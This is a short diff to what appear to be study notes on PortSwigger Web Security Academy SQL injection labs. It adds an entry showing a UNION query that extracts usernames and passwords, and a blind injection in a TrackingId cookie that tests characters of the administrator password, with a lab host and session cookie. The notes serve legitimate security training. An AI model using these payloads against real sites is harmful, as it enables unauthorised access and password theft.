@@ -37,4 +37,8 @@
     
 9.  https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
      GET /filter?category=Pets'+UNION+SELECT+NULL,username||password+FROM+users--
-10.  
+
+10. https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+     GET /filter?category=Gifts HTTP/2
+     Host: 0ad6007503ff60c98010453d007900de.web-security-academy.net
+     Cookie: TrackingId=bmSN7mgxz39pxSxs' AND SUBSTRING((SELECT password FROM Users WHERE username = 'administrator'), 1, 20) = 'x95u9gp2jz87dvomf0fu; session=VwOufCAF9NUO7dGbHzrvkOeKjmCTMMF7
